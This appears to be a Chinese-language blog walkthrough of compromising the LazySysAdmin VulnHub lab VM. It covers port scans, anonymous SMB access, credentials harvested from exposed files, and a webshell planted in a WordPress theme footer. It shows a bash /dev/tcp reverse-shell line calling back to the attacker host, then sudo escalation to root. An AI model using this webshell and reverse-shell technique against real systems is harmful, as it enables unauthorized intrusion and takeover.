+++
date = '2026-11-20T19:16:11+08:00'
draft = false
title = '[VulnHub靶机]Lazysysadmin渗透记录'
categories = ["靶机渗透"]
tags = ['渗透','Vulnhub','Wordpress','SMB']
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.22

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ sudo arp-scan -l
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.22     00:0c:29:01:7b:2f       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.005 seconds (127.68 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.22                                
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-20 19:17 +0800
Nmap scan report for 10.10.10.22
Host is up (0.0018s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
6667/tcp open  irc
MAC Address: 00:0C:29:01:7B:2F (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ sudo nmap -sT -sV -sC -O -p22,80,139,445,3306,6667 10.10.10.22
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-20 19:18 +0800
Nmap scan report for 10.10.10.22
Host is up (0.00054s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 4 disallowed entries
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-generator: Silex v2.2.7
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info:
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 10.10.10.3
|_  error: Closing link: (nmap@10.10.10.3) [Client exited]
MAC Address: 00:0C:29:01:7B:2F (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Sony Android TV (Android 5.0) (94%), Android 5.1 (94%), Android 8 (Linux 3.10) (94%), Linux 3.2 - 3.16 (94%), Linux 3.8 - 3.16 (94%), Android 4.0 (93%), Linux 4.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2026-11-21T05:18:48+10:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2026-11-20T19:18:48
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: mean: 4h40m01s, deviation: 5h46m24s, median: 8h00m00s
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.41 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ sudo nmap --script=vuln -p22,80,139,445,3306,6667 10.10.10.22
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-20 19:19 +0800
Nmap scan report for 10.10.10.22
Host is up (0.00031s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum:
|   /wordpress/: Blog
|   /test/: Test page
|   /robots.txt: Robots file
|   /info.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|   /apache/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_  /old/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
6667/tcp open  irc
|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).
| irc-botnet-channels:
|_  ERROR: TIMEOUT
MAC Address: 00:0C:29:01:7B:2F (VMware)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos:
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_

Nmap done: 1 IP address (1 host up) scanned in 321.38 seconds
```

## SMB信息收集

列出靶机SMB共享

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ smbclient -L 10.10.10.22 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        share$          Disk      Sumshare
        IPC$            IPC       IPC Service (Web server)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAZYSYSADMIN
```

尝试匿名连接share$共享

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ smbclient //10.10.10.22/share$ -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 15 19:05:52 2017
  ..                                  D        0  Mon Aug 14 20:34:47 2017
  wordpress                           D        0  Tue Aug 15 19:21:08 2017
  Backnode_files                      D        0  Mon Aug 14 20:08:26 2017
  wp                                  D        0  Tue Aug 15 18:51:23 2017
  deets.txt                           N      139  Mon Aug 14 20:20:05 2017
  robots.txt                          N       92  Mon Aug 14 20:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 20:39:56 2017
  apache                              D        0  Mon Aug 14 20:35:19 2017
  index.html                          N    36072  Sun Aug  6 13:02:15 2017
  info.php                            N       20  Tue Aug 15 18:55:19 2017
  test                                D        0  Mon Aug 14 20:35:10 2017
  old                                 D        0  Mon Aug 14 20:35:13 2017

                3029776 blocks of size 1024. 1459192 blocks available
```

这好像是网站源码, 将所有文件下载下来

```shell
mask ""
recurse ON
prompt OFF
mget *
```

## Web渗透

浏览器访问80端口

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

访问/robots.txt, 发现与从smb服务下载的一致

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/robots.avif)

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ cat robots.txt 
User-agent: *
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/
```

查看下载的deets.txt, 发现密码`12345`

```text
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
```

从wordpress配置文件中提取数据库信息, 得到数据库用户名`Admin`, 密码`TogieMYSQL12345^^`

```shell
┌──(kali㉿kali)-[~/Lazysysadmin/wordpress]
└─$ grep DB wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
```

尝试直接连接, 失败

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ mysql -h 10.10.10.22 -uAdmin -pTogieMYSQL12345^^ --ssl=0
ERROR 1130 (HY000): Host '10.10.10.3' is not allowed to connect to this MySQL server
```

访问wordpress, 得知作者叫togie

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/%E8%AE%BF%E9%97%AEwordpress.avif)

访问登录页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2.avif)

经尝试, 可以使用数据库的凭据登录进去

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95wp.avif)

之前Nmap扫描到了phpmyadmin, 我们也可以登录一下

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/%E8%AE%BF%E9%97%AEphpmyadmin.avif)

然而里面只有wordpress这一个库, 而且users里面只有Admin这一个用户, 没什么用

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93.avif)

修改外观, 在footer.php中插入一句话木马

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/%E7%AF%A1%E6%94%B9%E4%B8%BB%E9%A2%98.avif)

访问`http://10.10.10.22/wordpress/?cmd=whoami`会发现成功执行了我们的命令

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LazySysAdmin/%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C.avif)

然而通过传参的方式反弹shell一直不能成功, 我们直接将插入的一句话木马改为反弹shell代码, 再访问`http://10.10.10.22/wordpress/`即可获得shell

```php
system("/bin/bash -c '/bin/bash -i >&/dev/tcp/10.10.10.3/4444 0>&1'");
```

```shell
┌──(kali㉿kali)-[~/Lazysysadmin]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.22] 53400
bash: cannot set terminal process group (1188): Inappropriate ioctl for device
bash: no job control in this shell
www-data@LazySysAdmin:/var/www/html/wordpress$
```

## 权限提升

终端升级

```shell
python -c "import pty;pty.spawn('/bin/bash')"
```

查看有bash环境的用户

```shell
www-data@LazySysAdmin:/$ grep bash /etc/passwd
grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash
```

之前deets.txt提到了一个密码`12345`, 看看能不能登上togie

```shell
www-data@LazySysAdmin:/$ su togie
Password: 12345

togie@LazySysAdmin:/$
```

成功, 执行sudo -l, 发现能以root身份执行任何命令

```shell
togie@LazySysAdmin:/$ sudo -l
sudo -l
[sudo] password for togie: 12345

Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```

直接提权读flag

```shell
togie@LazySysAdmin:/$ sudo su
root@LazySysAdmin:/# cd /root
root@LazySysAdmin:~# ls -la
total 28
drwx------  3 root root 4096 Aug 15  2017 .
drwxr-xr-x 22 root root 4096 Aug 21  2017 ..
-rw-------  1 root root 1000 Aug 21  2017 .bash_history
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
drwx------  2 root root 4096 Aug 14  2017 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root  347 Aug 21  2017 proof.txt
root@LazySysAdmin:~# cat proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
```
